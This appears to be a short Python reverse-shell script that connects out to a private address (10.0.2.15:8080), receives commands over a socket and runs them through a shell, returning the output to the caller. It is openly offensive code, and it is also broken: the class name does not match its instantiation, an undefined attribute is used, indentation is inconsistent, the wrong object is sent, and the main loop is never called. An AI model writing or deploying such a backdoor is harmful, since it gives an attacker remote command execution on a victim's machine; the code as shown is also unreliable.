import socket
import subprocess

class Socket:
	def __init__(self, ip, port):
	self.Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	self.Connection.connect((ip,port))


	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

#Connection.send('Connection Successful\n')

	def start_socket(self):
		while True:

			command = self.my_connection.recv(1024)
			command_output = self.command_execution(command)

			self.Connection.send(command_execution)

		self.Connection.close()

my_socket_object = MySocket('10.0.2.15', 8080)
my_socket_object.start_socket

